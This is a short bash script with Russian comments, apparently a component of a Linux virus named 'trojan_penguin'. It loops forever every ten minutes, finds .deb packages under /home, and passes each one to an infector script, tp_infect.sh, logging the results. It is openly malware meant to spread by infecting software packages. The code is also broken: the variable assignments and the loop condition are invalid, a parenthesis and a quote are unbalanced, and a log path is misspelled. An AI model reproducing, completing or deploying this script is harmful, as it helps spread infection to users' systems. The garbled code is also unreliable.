#!/bin/bash

debug = ""

#Создаем папку для записи логов, если таковой нет
if ! [ -d $debug/var/log/trojan_penguin/ ]; then 
  mkdir $debug/var/log/trojan_penguin
fi 

#Работаем в бесконечном цикле делая паузы по 10 минут

while [1]
do
  list = $(find /home -name "*deb"

  for line in $list
  do
    $debug/usr/bin/tp_infect.sh $line >> $debug'/var/lo/trojan_penguin/log
  done 
  date > $debug/var/log/trojan_penguin/last_start
  sleep 600
done
